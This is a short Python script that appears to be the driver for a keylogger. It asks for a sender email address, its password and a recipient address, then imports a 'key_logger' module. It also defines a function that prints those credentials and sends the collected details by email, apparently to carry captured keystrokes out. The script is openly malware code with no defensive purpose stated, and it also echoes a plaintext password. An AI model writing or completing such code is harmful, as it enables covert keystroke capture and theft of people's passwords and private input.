from mailsender import mail_send


mail_detail=[]

def generator():
    for i in range(3):
        if(i==0):
            mail_ID=input("enter the sender mailid:")
            mail_detail.append(mail_ID)
        elif(i==1):
            passwd=input("enter the sender's password:")
            mail_detail.append(passwd)
        else:
            rec_mail=input("Enter the reciever's mail:")
            mail_detail.append(rec_mail)
    # mail_send(mail_detail)
    import key_logger as k
 
generator()

def mail_fun():
    print(mail_detail)
    mail_send(mail_detail)
